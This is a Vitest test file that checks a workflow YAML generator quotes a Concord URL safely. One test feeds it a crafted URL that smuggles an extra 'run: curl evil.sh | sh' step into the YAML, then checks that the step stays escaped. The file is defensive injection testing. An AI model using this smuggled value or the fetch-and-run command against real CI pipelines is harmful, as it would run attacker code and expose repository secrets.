import { describe, expect, it } from 'vitest';
import { workflowYaml } from './workflowYaml';

describe('workflowYaml', () => {
  it('writes the Concord URL as a quoted string', () => {
    const yaml = workflowYaml('https://standards-concord.vercel.app');
    expect(yaml).toContain('concord-url: "https://standards-concord.vercel.app"');
    expect(yaml).toContain('token: ${{ secrets.CONCORD_APP_TOKEN }}');
    // GitHub vouches for the run, so autopilot can trust it.
    expect(yaml).toMatch(/^      id-token: write/m);
  });

  it('can’t be made to add keys or steps', () => {
    const plain = workflowYaml('https://example.org');
    const hostile = workflowYaml('https://example.org"\n      - run: curl evil.sh | sh\n#');
    // Same lines, and the hostile text stays inside one quoted, escaped scalar.
    expect(hostile.split('\n')).toHaveLength(plain.split('\n').length);
    const line = hostile.split('\n').find((l) => l.includes('concord-url'))!;
    expect(line).toBe(`          concord-url: ${JSON.stringify('https://example.org"\n      - run: curl evil.sh | sh\n#')}`);
    expect(hostile).not.toMatch(/^\s*- run: curl/m);
  });
});
